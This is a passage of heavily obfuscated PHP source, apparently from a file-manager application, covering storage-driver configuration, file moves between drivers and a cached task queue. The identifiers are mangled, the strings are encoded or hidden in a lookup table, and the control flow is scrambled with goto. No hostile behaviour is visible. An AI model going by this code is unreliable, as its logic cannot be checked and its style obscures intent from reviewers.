¶[37] => 0)); } } $this->updateBackup($ŸæÂÈŒÑ, $Ò––¤Œ¸); } return $´À ”òï; } public function add($Î©°ßå¥) { $×»É•‡ö =& $_SERVER[ˆö¿ÚÌ¼]; $¼×’ÜÎü = array_to_keyvalue(parent::listData(), $×»É•‡ö[32]); if (isset($¼×’ÜÎü[$Î©°ßå¥[$×»É•‡ö[32]]])) { return !1; } $this->checkConfig($Î©°ßå¥); $¥÷¦™Ê = parent::insert($Î©°ßå¥); if ($¥÷¦™Ê && $Î©°ßå¥[$×»É•‡ö[37]]) { foreach ($¼×’ÜÎü as $Ä†è¾šñ) { if ($Ä†è¾šñ[$×»É•‡ö[37]]) { parent::update($Ä†è¾šñ[$×»É•‡ö[478]], array($×»É•‡ö[37] => 0)); } } } return $¥÷¦™Ê; } public function updateBackup($·‰ˆÁ¤ı, $Ï›ÄÌ¨ğ) { $®Ş²õ‘Ä =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Ï›ÄÌ¨ğ) { return; } $ÄÄùœØ = Model($®Ş²õ‘Ä[833])->config(); if ($ÄÄùœØ[$®Ş²õ‘Ä[1754]] != $®Ş²õ‘Ä[91] || $ÄÄùœØ[$®Ş²õ‘Ä[837]] != $Ï›ÄÌ¨ğ) { return; } $î§Ãßíì = Model($®Ş²õ‘Ä[855])->get($®Ş²õ‘Ä[862]); $î§Ãßíì = json_decode($î§Ãßíì, !0); if (!$î§Ãßíì) { return; } $î§Ãßíì[$®Ş²õ‘Ä[837]] = $·‰ˆÁ¤ı; Model($®Ş²õ‘Ä[855])->set(array($®Ş²õ‘Ä[862] => $î§Ãßíì)); } public function checkPwd($é»Æ÷ïÌ, &$›âºå‡ã) { $İ‡ƒÔ±Ô =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($›âºå‡ã[$İ‡ƒÔ±Ô[6]])) { return; } $ùâû–¾Ğ = $›âºå‡ã[$İ‡ƒÔ±Ô[6]]; if (!is_array($ùâû–¾Ğ)) { $ùâû–¾Ğ = json_decode($ùâû–¾Ğ, !0); } $ùõ´œ™× = $İ‡ƒÔ±Ô[12]; $¶Ùà¦ãë = array($İ‡ƒÔ±Ô[2327], $İ‡ƒÔ±Ô[2328], $İ‡ƒÔ±Ô[980]); foreach ($¶Ùà¦ãë as $†åó§½¼) { if (isset($ùâû–¾Ğ[$†åó§½¼])) { $ùõ´œ™× = $†åó§½¼; break; } } if (!$ùõ´œ™×) { return; } $ú˜û‚” = $this->getConfig($é»Æ÷ïÌ); $··ò‰ã = $ú˜û‚”[$ùõ´œ™×]; $¢†Öê‚é = $ùâû–¾Ğ[$ùõ´œ™×]; if ($¢†Öê‚é == str_repeat($İ‡ƒÔ±Ô[223], strlen($··ò‰ã))) { $ùâû–¾Ğ[$ùõ´œ™×] = $··ò‰ã; $›âºå‡ã[$İ‡ƒÔ±Ô[6]] = json_encode($ùâû–¾Ğ); } else { if ($¢†Öê‚é != $··ò‰ã) { $›âºå‡ã[$İ‡ƒÔ±Ô[2326]] = $İ‡ƒÔ±Ô[91]; } } } public function checkConfig(&$îÒÒúšø, $†Şıóö = false) { $½ŠÅ¨Æ¬ =& $_SERVER[ˆö¿ÚÌ¼]; $¦İÉúå¯ = strtolower($îÒÒúšø[$½ŠÅ¨Æ¬[98]]); $©çü…’ = $îÒÒúšø[$½ŠÅ¨Æ¬[6]]; if (!is_array($©çü…’)) { $©çü…’ = json_decode($©çü…’, !0); } foreach ($©çü…’ as $Êìùß·Ş => $¢ÑÚÀ€Î) { if (is_string($¢ÑÚÀ€Î)) { $©çü…’[$Êìùß·Ş] = trim($¢ÑÚÀ€Î); } } $©çü…’[$½ŠÅ¨Æ¬[2329]] = rand_string(6); $«»ı”¾ = $GLOBALS[$½ŠÅ¨Æ¬[6]][$½ŠÅ¨Æ¬[92]][$½ŠÅ¨Æ¬[916]]; $¼ó´ãÛË = isset($«»ı”¾[$¦İÉúå¯]) ? $«»ı”¾[$¦İÉúå¯] : ucfirst($¦İÉúå¯); $ÆçŸß©· = $½ŠÅ¨Æ¬[77] . $¼ó´ãÛË; if (!$¼ó´ãÛË || !class_exists($ÆçŸß©·)) { if ($†Şıóö) { return LNG($½ŠÅ¨Æ¬[2330]); } write_log(array($½ŠÅ¨Æ¬[2331], $îÒÒúšø, get_caller_info()), $½ŠÅ¨Æ¬[216]); show_json(LNG($½ŠÅ¨Æ¬[2330]), !1, $îÒÒúšø); } $ï…ñÊ‹ò = new $ÆçŸß©·($©çü…’); $¢¤¥Öİ¾ = rtrim($©çü…’[$½ŠÅ¨Æ¬[1276]], $½ŠÅ¨Æ¬[8]) . $½ŠÅ¨Æ¬[8]; if (in_array($¦İÉúå¯, $ï…ñÊ‹ò->objectDriver)) { try { if (!$ï…ñÊ‹ò->isBucketCors() && !$ï…ñÊ‹ò->setBucketCors()) { $¯†ê“óŒ = LNG($½ŠÅ¨Æ¬[2332]); $¯†ê“óŒ .= $½ŠÅ¨Æ¬[2333] . LNG($½ŠÅ¨Æ¬[2334]); } } catch (Exception $ÛØà¾¤È) { $¯†ê“óŒ = $ÛØà¾¤È->getMessage(); } if (isset($¯†ê“óŒ)) { return $this->_parseError($¯†ê“óŒ, $¦İÉúå¯, $†Şıóö); } if ($¦İÉúå¯ == $½ŠÅ¨Æ¬[68] && !$ï…ñÊ‹ò->checkRegion()) { return $this->_parseError(LNG($½ŠÅ¨Æ¬[2335]), $¦İÉúå¯, $†Şıóö); } } else { if ($¦İÉúå¯ == $½ŠÅ¨Æ¬[2336]) { if ($ï…ñÊ‹ò->ftpPath) { $£ê•˜´ = trim($¢¤¥Öİ¾, $½ŠÅ¨Æ¬[8]); if (stripos($£ê•˜´, trim($ï…ñÊ‹ò->ftpPath, $½ŠÅ¨Æ¬[8])) !== 0) { $¢¤¥Öİ¾ = $ï…ñÊ‹ò->ftpPath . $½ŠÅ¨Æ¬[8] . ($£ê•˜´ ? $£ê•˜´ . $½ŠÅ¨Æ¬[8] : $½ŠÅ¨Æ¬[12]); } } } } $Úù”×å = $ï…ñÊ‹ò->getPath($¢¤¥Öİ¾ . $½ŠÅ¨Æ¬[1280]); try { if ($¦İÉúå¯ == $½ŠÅ¨Æ¬[109]) { $ï…ñÊ‹ò->mkdir($¢¤¥Öİ¾); } $¯Ãë¶Ÿî = $ï…ñÊ‹ò->mkfile($Úù”×å); if (!$¯Ãë¶Ÿî) { $¯†ê“óŒ = LNG($½ŠÅ¨Æ¬[2332]); } } catch (Exception $ÛØà¾¤È) { $¯†ê“óŒ = $ÛØà¾¤È->getMessage(); } if (isset($¯†ê“óŒ)) { return $this->_parseError($¯†ê“óŒ, $¦İÉúå¯, $†Şıóö); } $©çü…’[$½ŠÅ¨Æ¬[1276]] = $¢¤¥Öİ¾; $îÒÒúšø[$½ŠÅ¨Æ¬[6]] = json_encode($©çü…’); $îÒÒúšø[$½ŠÅ¨Æ¬[98]] = $¼ó´ãÛË; return !0; } private function _parseError($æéšûØ, $¼şÇØÁ, $äú÷‘½ù = false) { $ìê¬Óš› =& $_SERVER[ˆö¿ÚÌ¼]; if ($¼şÇØÁ == $ìê¬Óš›[68] && stripos($æéšûØ, $ìê¬Óš›[2337])) { $½Ó§Ç½Ï = explode($ìê¬Óš›[10], $æéšûØ); $¤ĞûÑÚå = isset($½Ó§Ç½Ï[1]) ? $½Ó§Ç½Ï[1] : $ìê¬Óš›[12]; $úöŒ ­  = array($ìê¬Óš›[2338] => LNG($ìê¬Óš›[2339]), $ìê¬Óš›[2340] => LNG($ìê¬Óš›[2341])); if (isset($úöŒ ­ [$¤ĞûÑÚå])) { $æéšûØ = $úöŒ ­ [$¤ĞûÑÚå]; } } if (stripos($æéšûØ, $ìê¬Óš›[2342]) === 0) { $ó®ºÛÈƒ = strpos($æéšûØ, $ìê¬Óš›[178]); if ($ó®ºÛÈƒ === !1) { $ó®ºÛÈƒ = strpos($æéšûØ, $ìê¬Óš›[4]); } if ($ó®ºÛÈƒ !== !1) { $æéšûØ = substr($æéšûØ, $ó®ºÛÈƒ + 1); } } $æéšûØ = LNG($ìê¬Óš›[1283]) . $æéšûØ; if ($äú÷‘½ù) { return $æéšûØ; } show_json($æéšûØ, !1); } public function driverListSystem() { $‰»÷£Æ’ =& $_SERVER[ˆö¿ÚÌ¼]; $‘©Ş‚Š = parent::listData(); $¢ï’™Â = array(); foreach ($‘©Ş‚Š as $‹¿ïúé) { unset($‹¿ïúé[$‰»÷£Æ’[234]], $‹¿ïúé[$‰»÷£Æ’[88]]); if (!is_array($‹¿ïúé[$‰»÷£Æ’[6]])) { $‹¿ïúé[$‰»÷£Æ’[6]] = json_decode($‹¿ïúé[$‰»÷£Æ’[6]], !0); } $¢ï’™Â[] = $‹¿ïúé; } return $¢ï’™Â; } public function defaultDriver() { $èÇ—× =& $_SERVER[ˆö¿ÚÌ¼]; $ßà¿º = parent::listData(); $ÏàÓ‰ûŠ = array_filter_by_field($ßà¿º, $èÇ—×[37], 1); $ÏàÓ‰ûŠ = $ÏàÓ‰ûŠ[0]; if (!$ÏàÓ‰ûŠ) { return array(); } if (!is_array($ÏàÓ‰ûŠ[$èÇ—×[6]])) { $ÏàÓ‰ûŠ[$èÇ—×[6]] = json_decode($ÏàÓ‰ûŠ[$èÇ—×[6]], !0); } return $ÏàÓ‰ûŠ; } public function driverInfo($ğë¤ŸçÆ) { $ÛÊÚ—ë± =& $_SERVER[ˆö¿ÚÌ¼]; $ì’ŸĞ£õ = array_to_keyvalue(parent::listData(), $ÛÊÚ—ë±[478]); if (!isset($ì’ŸĞ£õ[$ğë¤ŸçÆ])) { return !1; } $ÅÒúîÎÃ = $ì’ŸĞ£õ[$ğë¤ŸçÆ]; if (!is_array($ÅÒúîÎÃ[$ÛÊÚ—ë±[6]])) { $ÅÒúîÎÃ[$ÛÊÚ—ë±[6]] = json_decode($ÅÒúîÎÃ[$ÛÊÚ—ë±[6]], !0); } return $ÅÒúîÎÃ; } public function remove($‚­»à¸½) { $this->removeShareItems($‚­»à¸½); return parent::remove($‚­»à¸½); } public function removeWithFile($Ğ‚¾Ø™š, $”µ¾àÜ®, $Ø¹ø„¥º, $š¬¸ö‘ = false) { $éè÷ÄÔ† =& $_SERVER[ˆö¿ÚÌ¼]; $Ê·¼‹…Ë = array($éè÷ÄÔ†[908] => $Ğ‚¾Ø™š); $É¶ŞºŞş = Model($éè÷ÄÔ†[558])->where($Ê·¼‹…Ë)->count(); $‹Š‚Ã… = Model($éè÷ÄÔ†[558])->where($Ê·¼‹…Ë)->sum($éè÷ÄÔ†[79]); $ÔÕÎùÖœ = $”µ¾àÜ® . $éè÷ÄÔ†[2343] . $Ğ‚¾Ø™š; $çÁ²­’â = LNG($”µ¾àÜ® == $éè÷ÄÔ†[637] ? $éè÷ÄÔ†[2344] : $éè÷ÄÔ†[2345]); $áŞˆ—ìæ = new TaskFileTransfer($ÔÕÎùÖœ, $éè÷ÄÔ†[216], $É¶ŞºŞş, $çÁ²­’â . $éè÷ÄÔ†[465] . $Ø¹ø„¥º[$éè÷ÄÔ†[32]] . $éè÷ÄÔ†[215] . $Ğ‚¾Ø™š); $áŞˆ—ìæ->task[$éè÷ÄÔ†[848]] = (double) $‹Š‚Ã…; $¿¿›”Öç = KodIO::defaultDriver(); $ª­ÕŠË– = $¿¿›”Öç[$éè÷ÄÔ†[478]]; $«Ã›»´ = $å…îÔçâ = $§ë‚”Ó = array(); $ÂüÎŞÈÈ = Model($éè÷ÄÔ†[233])->where($Ê·¼‹…Ë)->field($éè÷ÄÔ†[2346])->select(); foreach ($ÂüÎŞÈÈ as $ŠôïõôÇ) { $–½ÄŸøé = $ŠôïõôÇ[$éè÷ÄÔ†[555]]; if ($š¬¸ö‘) { $å…îÔçâ[] = $–½ÄŸøé; continue; } $Ü’ÜñïÒ = $ŠôïõôÇ[$éè÷ÄÔ†[87]]; $«ëæ–Öú = get_path_father($Ü’ÜñïÒ); $§ë‚”Ó[] = $«ëæ–Öú; $«ëæ–Öú = str_replace("\x7b\151\x6f\x3a{$Ğ‚¾Ø™š}\x7d\57", "\x7b\151\x6f\x3a{$ª­ÕŠË–}\175\57", $«ëæ–Öú); if (!IO::exist($Ü’ÜñïÒ)) { $«Ã›»´[] = $–½ÄŸøé; $áŞˆ—ìæ->updateFileEnd($ŠôïõôÇ[$éè÷ÄÔ†[32]], $ŠôïõôÇ[$éè÷ÄÔ†[79]]); write_log($éè÷ÄÔ†[2347] . $Ü’ÜñïÒ, $éè÷ÄÔ†[1917]); continue; } $•ùüíœ = IO::move($Ü’ÜñïÒ, $«ëæ–Öú, REPEAT_RENAME); if (!$•ùüíœ) { $å…îÔçâ[] = $–½ÄŸøé; $áŞˆ—ìæ->updateFileEnd($ŠôïõôÇ[$éè÷ÄÔ†[32]], $ŠôïõôÇ[$éè÷ÄÔ†[79]]); write_log($éè÷ÄÔ†[2348] . $Ü’ÜñïÒ, $éè÷ÄÔ†[1917]); continue; } $Ê·¼‹…Ë = array($éè÷ÄÔ†[555] => $–½ÄŸøé); $Æ¼Úñş² = array($éè÷ÄÔ†[908] => $ª­ÕŠË–, $éè÷ÄÔ†[87] => $•ùüíœ); Model($éè÷ÄÔ†[233])->where($Ê·¼‹…Ë)->save($Æ¼Úñş²); } $Úø‚ãã° = $áŞˆ—ìæ->task; if (!$š¬¸ö‘) { Cache::set($ÔÕÎùÖœ, $Úø‚ãã°); } $áŞˆ—ìæ->end(); $«Ã›»´ = array_unique($«Ã›»´); $å…îÔçâ = array_unique($å…îÔçâ); if (!$š¬¸ö‘ && ($«Ã›»´ || $å…îÔçâ)) { $ûÆœ»‘Ø = array(); if ($«Ã›»´) { $ûÆœ»‘Ø[] = sprintf(LNG($éè÷ÄÔ†[2349]), count($«Ã›»´)); } if ($å…îÔçâ) { $ûÆœ»‘Ø[] = sprintf(LNG($éè÷ÄÔ†[2350]), count($å…îÔçâ)); } $ûÆœ»‘Ø = sprintf(LNG($éè÷ÄÔ†[2351]), implode($éè÷ÄÔ†[2352], $ûÆœ»‘Ø)) . $éè÷ÄÔ†[2353] . date($éè÷ÄÔ†[2354]) . $éè÷ÄÔ†[2355]; if ($”µ¾àÜ® == $éè÷ÄÔ†[1954]) { $ûÆœ»‘Ø .= $éè÷ÄÔ†[2356] . LNG($éè÷ÄÔ†[2357]); } else { $ûÆœ»‘Ø = LNG($éè÷ÄÔ†[2358]) . $éè÷ÄÔ†[2359] . $ûÆœ»‘Ø; } $Úø‚ãã°[$éè÷ÄÔ†[1278]] = $ûÆœ»‘Ø; Cache::set($ÔÕÎùÖœ, $Úø‚ãã°); unset($Ø¹ø„¥º[$éè÷ÄÔ†[6]]); $”³€íàº = array($éè÷ÄÔ†[478] => $Ğ‚¾Ø™š, $éè÷ÄÔ†[2228] => $éè÷ÄÔ†[637], $éè÷ÄÔ†[32] => $Ø¹ø„¥º[$éè÷ÄÔ†[32]], $éè÷ÄÔ†[98] => $Ø¹ø„¥º[$éè÷ÄÔ†[98]]); Hook::trigger($éè÷ÄÔ†[1796], array($éè÷ÄÔ†[1301] => $”³€íàº, $éè÷ÄÔ†[1311] => !0)); show_json($ûÆœ»‘Ø, !1, 100111); } if ($”µ¾àÜ® == $éè÷ÄÔ†[637]) { return !0; } if ($«Ã›»´ || $å…îÔçâ) { $èüäÑø = array_merge($«Ã›»´, $å…îÔçâ); $èüäÑø = array_filter(array_unique($èüäÑø)); $this->removeByFileID($èüäÑø); } if ($§ë‚”Ó) { $§ë‚”Ó = array_filter(array_unique($§ë‚”Ó)); foreach ($§ë‚”Ó as $Ü’ÜñïÒ) { $³ï˜ùú½ = IO::has($Ü’ÜñïÒ, !0); if (!$³ï˜ùú½[$éè÷ÄÔ†[242]] && !$³ï˜ùú½[$éè÷ÄÔ†[243]]) { IO::remove($Ü’ÜñïÒ); } } } return $this->remove($Ğ‚¾Ø™š); } private function removeByFileID($£äÓğ›É = array()) { $²¢­Ş¢« =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($£äÓğ›É)) { return; } $½©ÎªüÏ = array($²¢­Ş¢«[555] => array($²¢­Ş¢«[7], $£äÓğ›É)); $œÕİÛ¦® = Model($²¢­Ş¢«[1435])->where($½©ÎªüÏ)->field($²¢­Ş¢«[194])->select(); if (!$œÕİÛ¦®) { return Model($²¢­Ş¢«[558])->remove($£äÓğ›É); } $œÕİÛ¦® = array_to_keyvalue($œÕİÛ¦®, $²¢­Ş¢«[12], $²¢­Ş¢«[194]); foreach ($œÕİÛ¦® as $›¼Æ»Ø) { Model($²¢­Ş¢«[915])->removeNow($›¼Æ»Ø, !1); } } private function removeShareItems($ø¶½ıç) { $‹º¯ÅÚÓ =& $_SERVER[ˆö¿ÚÌ¼]; $Æœ±Ú¬À = "\x7b\151\x6f\x3a{$ø¶½ıç}\x7d\57"; $øŒˆÅú = array($‹º¯ÅÚÓ[194] => 0, $‹º¯ÅÚÓ[1271] => array($‹º¯ÅÚÓ[462], "{$Æœ±Ú¬À}\x25")); $Î õÔŞ = Model($‹º¯ÅÚÓ[1965])->where($øŒˆÅú)->field($‹º¯ÅÚÓ[682])->select(); if (empty($Î õÔŞ)) { return; } $ÑÏ’İ½© = array_to_keyvalue($Î õÔŞ, $‹º¯ÅÚÓ[12], $‹º¯ÅÚÓ[682]); Model($‹º¯ÅÚÓ[681])->remove($ÑÏ’İ½©); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\114\x69\147\x68\x74\101\160\x70"; public $modelType = "\x53\x79\x73\164\x65\x6d\117\160\x74\151\157\156"; public $field = array("\156\x61\x6d\145", "\147\x72\157\x75\160", "\144\x65\163\143", "\x63\x6f\156\x74\145\156\164"); public function listData($ú¦»ğ²¯ = false, $‚‡ø‚öÌ = "\155\157\144\151\x66\171\124\151\x6d\x65", $É‰ÉÏĞ¥ = true) { return parent::listData($ú¦»ğ²¯, $‚‡ø‚öÌ, $É‰ÉÏĞ¥); } public function remove($ÎÔëâÑ) { $ä“Îää = $this->findByName($ÎÔëâÑ); if (!$ä“Îää) { return !1; } return parent::remove($ä“Îää[$_SERVER[ˆö¿ÚÌ¼][478]]); } public function add($ø³œ…Ø–) { if ($this->findByName($ø³œ…Ø–[$_SERVER[ˆö¿ÚÌ¼][32]])) { return !1; } return parent::insert($ø³œ…Ø–); } public function update($‘‘Ûêù, $…¾ÇÓ³) { $¯—øƒÑâ =& $_SERVER[ˆö¿ÚÌ¼]; $çå´°°² = $this->findByName($‘‘Ûêù); $²­´´èÇ = $this->findByName($…¾ÇÓ³[$¯—øƒÑâ[32]]); if (!$çå´°°² || $²­´´èÇ && $²­´´èÇ[$¯—øƒÑâ[478]] != $çå´°°²[$¯—øƒÑâ[478]]) { return !1; } return parent::update($çå´°°²[$¯—øƒÑâ[478]], $…¾ÇÓ³); } } goto BŠàÙ¾Ø‹ˆ; A±óõò¥°: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\165\145\165\145\x4c\145\156\x67\x74\150"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\x65\x75\x65\x44\141\164\141"; const QUEUE_TIME = "\x74\141\163\x6b\121\x75\x65\165\145\x4c\x61\163\164\122\x75\x6e"; const QUEUE_THREAD = "\164\x61\163\x6b\x51\x75\x65\165\145\124\150\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($øÅÈ¿´–, $¯™†á…º = array(), $´‚Ì‡Á± = '', $¸£‡ Ñ˜ = '') { $ÎÒ½ÒÙè =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¸£‡ Ñ˜ && array_find_by_field(self::$listData, $ÎÒ½ÒÙè[97], $¸£‡ Ñ˜)) { return !0; } if ($¸£‡ Ñ˜ && array_find_by_field(self::$listDataAdd, $ÎÒ½ÒÙè[97], $¸£‡ Ñ˜)) { return !0; } self::$listDataAdd[] = array($ÎÒ½ÒÙè[344] => $øÅÈ¿´–, $ÎÒ½ÒÙè[1885] => $¯™†á…º, $ÎÒ½ÒÙè[538] => $´‚Ì‡Á±, $ÎÒ½ÒÙè[97] => $¸£‡ Ñ˜); return !0; } public static function addSubmit() { $Á®æ«¥… =& $_SERVER[ˆö¿ÚÌ¼]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Á®æ«¥…[1886] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Á®æ«¥…[12], $Á®æ«¥…[538])), $Á®æ«¥…[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($à¯æÇĞš, $¦Ûáæû = array(), $ÊÜµ¸¤¤ = '', $¹êÚ¨ë = '') { $³ù»°•ç =& $_SERVER[ˆö¿ÚÌ¼]; if (self::count() >= self::MAX_LENGTH) { return !1; } $±×îÏ•Ú = self::getAll(); if ($¹êÚ¨ë && array_find_by_field($±×îÏ•Ú, $³ù»°•ç[97], $¹êÚ¨ë)) { return !0; } $±×îÏ•Ú[] = array($³ù»°•ç[344] => $à¯æÇĞš, $³ù»°•ç[1885] => $¦Ûáæû, $³ù»°•ç[538] => $ÊÜµ¸¤¤, $³ù»°•ç[97] => $¹êÚ¨ë); self::setAll($±×îÏ•Ú); write_log($³ù»°•ç[1886] . $ÊÜµ¸¤¤, $³ù»°•ç[198]); return !0; } public static function run() { $Ú³”–± =& $_SERVER[ˆö¿ÚÌ¼]; $æ”˜•ˆÌ = self::getAll(); $ø…ºˆô = array_shift($æ”˜•ˆÌ); if (!$ø…ºˆô) { return !1; } self::setAll($æ”˜•ˆÌ); $ÍéƒÅ¢³ = timeFloat(); $…˜æúå¿ = $Ú³”–±[12]; try { $…˜æúå¿ = Hook::apply($ø…ºˆô[$Ú³”–±[344]], $ø…ºˆô[$Ú³”–±[1885]]); } catch (Exception $õù®éÈª) { write_log($õù®éÈª, $Ú³”–±[1278]); } $Ä£¸ñµø = number_format(timeFloat() - $ÍéƒÅ¢³, 3) . $Ú³”–±[1801]; if ($…˜æúå¿ && is_string($…˜æúå¿)) { $Ä£¸ñµø = $Ä£¸ñµø . $Ú³”–±[1887] . $…˜æúå¿; } write_log($Ú³”–±[1888] . $ø…ºˆô[$Ú³”–±[538]] . $Ú³”–±[1889] . $Ä£¸ñµø, $Ú³”–±[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $‘åı¦ôÊ =& $_SERVER[ˆö¿ÚÌ¼]; $Ó‡³·÷ï = self::threadCount() + 1; if ($Ó‡³·÷ï > 3 || !self::count()) { return; } write_log($‘åı¦ôÊ[1890] . $Ó‡³·÷ï, $‘åı¦ôÊ[198]); Cache::set(self::QUEUE_THREAD, $Ó‡³·÷ï, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($‘åı¦ôÊ[1891], $‘åı¦ôÊ[198]); } public static function getKey($Û¯Şªš°, $¹ÎÂ‚²É = "\151\156\x74") { $†ºÀÕ” =& $_SERVER[ˆö¿ÚÌ¼]; Cache::removeMemory($Û¯Şªš°); $®ğî–ÓÚ = Cache::get($Û¯Şªš°); if ($¹ÎÂ‚²É == $†ºÀÕ”[366]) { return $®ğî–ÓÚ ? intval($®ğî–ÓÚ) : 0; } if ($¹ÎÂ‚²É == $†ºÀÕ”[1892]) { return is_array($®ğî–ÓÚ) ? $®ğî–ÓÚ : array(); } return $®ğî–ÓÚ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ˆö¿ÚÌ¼][1892]); } public static function setAll($—áûÓÀ°) { $ÉŒÔ›äÛ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($—áûÓÀ°), $ÉŒÔ›äÛ); Cache::set(self::QUEUE_DATA, $—áûÓÀ°, $ÉŒÔ›äÛ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‹æ¢ı­, $ÁÑŞ£° = 5.0) { if (!$‹æ¢ı­) { return; } $àœ‹µæ¬ = Cache::get($‹æ¢ı­); if (!$àœ‹µæ¬ || timeFloat() - floatVal($àœ‹µæ¬) >= $ÁÑŞ£°) { Cache::set($‹æ¢ı­, timeFloat(), $ÁÑŞ£° * 10); return !0; } return !1; } public static function timeLimitCall($ôç§Í²Æ, $Î¹î©, $„ãå—òÖ, $¶÷À¾Àè = 5.0) { $ø¬··íí =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ôç§Í²Æ || !$Î¹î©) { return; } self::$asyncAdd = !0; $®Áˆ‡× = $ø¬··íí[1893]; $òïê¨‹Ç = Cache::get($®Áˆ‡×, !0); $Îı÷‚õİ = array($ø¬··íí[1894] => timeFloat(), $ø¬··íí[1895] => timeFloat(), $ø¬··íí[344] => $Î¹î©, $ø¬··íí[1885] => $„ãå—òÖ, $ø¬··íí[207] => $¶÷À¾Àè); if (is_array($òïê¨‹Ç[$ôç§Í²Æ])) { $Îı÷‚õİ[$ø¬··íí[1895]] = $òïê¨‹Ç[$ôç§Í²Æ][$ø¬··íí[1895]]; } if (is_array($òïê¨‹Ç[$ôç§Í²Æ])) { if (timeFloat() - $òïê¨‹Ç[$ôç§Í²Æ][$ø¬··íí[1894]] < $Îı÷‚õİ[$ø¬··íí[207]] * 0.3) { return; } $Îı÷‚õİ[$ø¬··íí[1895]] = $òïê¨‹Ç[$ôç§Í²Æ][$ø¬··íí[1895]]; } $òïê¨‹Ç[$ôç§Í²Æ] = $Îı÷‚õİ; Cache::set($®Áˆ‡×, $òïê¨‹Ç, 60); Cache::removeMemory($®Áˆ‡×); write_log($ø¬··íí[1896] . $ôç§Í²Æ . $ø¬··íí[74] . $Î¹î©, $ø¬··íí[198]); } public static function timeLimitCallLoop() { $Û‹õÇ¤® =& $_SERVER[ˆö¿ÚÌ¼]; $­ƒµƒ = array($Û‹õÇ¤®[1897]); $áğ’§ˆ = in_array(strtolower(ACTION), $­ƒµƒ); if (!$áğ’§ˆ && !self::$asyncAdd) { return; } $É†ûÛàç = $Û‹õÇ¤®[1893]; $âùÇÅ—¼ = Cache::get($É†ûÛàç, !0); if (!$âùÇÅ—¼ || count($âùÇÅ—¼) <= 0) { return; } $¨º—€¶¦ = !1; $‚şá˜ÛÀ = timeFloat(); $¤´ë¾Óé = array(); foreach ($âùÇÅ—¼ as $õÓÎ¥¿ => $çŸÒ“½œ) { if ($‚şá˜ÛÀ - $çŸÒ“½œ[$Û‹õÇ¤®[1895]] > $çŸÒ“½œ[$Û‹õÇ¤®[207]]) { $¨º—€¶¦ = !0; try { Hook::apply($çŸÒ“½œ[$Û‹õÇ¤®[344]], $çŸÒ“½œ[$Û‹õÇ¤®[1885]]); write_log($Û‹õÇ¤®[1898] . $õÓÎ¥¿ . $Û‹õÇ¤®[74] . $çŸÒ“½œ[$Û‹õÇ¤®[344]] . $Û‹õÇ¤®[1899] . ACTION, $Û‹õÇ¤®[198]); } catch (Exception $£û»ïò÷) { } continue; } $¤´ë¾Óé[$õÓÎ¥¿] = $çŸÒ“½œ; } if (!$¨º—€¶¦) { return; } if (!$¤´ë¾Óé) { return Cache::remove($É†ûÛàç); } Cache::set($É†ûÛàç, $¤´ë¾Óé, 60); Cache::removeMemory($É†ûÛàç); } public static function finished($Ÿ±¹¬³¬, $‰¿Õ÷®¼) { $Ùˆä‡› =& $_SERVER[ˆö¿ÚÌ¼]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ùˆä‡›[344] => $Ÿ±¹¬³¬, $Ùˆä‡›[1885] => $‰¿Õ÷®¼); } private static function finishedRun() { $ôÆæè—í =& $_SERVER[ˆö¿ÚÌ¼]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ÓÓ¥Şé) { try { Hook::apply($ÓÓ¥Şé[$ôÆæè—í[344]], $ÓÓ¥Şé[$ôÆæè—í[1885]]); } catch (Exception $µü°‡Õ‚) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $±Â“†ıŠ =& $_SERVER[ˆö¿ÚÌ¼]; parent::startAfter(); Hook::bind($±Â“†ıŠ[1900], array($this, $±Â“†ıŠ[1901])); Hook::bind($±Â“†ıŠ[1292], array($this, $±Â“†ıŠ[1902])); Hook::bind($±Â“†ıŠ[1903], array($this, $±Â“†ıŠ[1904])); $¿ú‡õËø =& $this->task; $¿ú‡õËø[$±Â“†ıŠ[1905]] = $±Â“†ıŠ[1293]; if (!$¿ú‡õËø[$±Â“†ıŠ[1673]]) { $¿ú‡õËø[$±Â“†ıŠ[1673]] = LNG($±Â“†ıŠ[1906]); } } protected function endAfter() { $ëôˆ§Î‚ =& $_SERVER[ˆö¿ÚÌ¼]; parent::endAfter(); Hook::unbind($ëôˆ§Î‚[1900], array($this, $ëôˆ§Î‚[1901])); Hook::unbind($ëôˆ§Î‚[1292], array($this, $ëôˆ§Î‚[1902])); Hook::unbind($ëôˆ§Î‚[1903], array($this, $ëôˆ§Î‚[1904])); } public function updateAfter() { $÷‘•¼çÉ =& $_SERVER[ˆö¿ÚÌ¼]; $ı–ÉÇµÜ =& $this->task; if 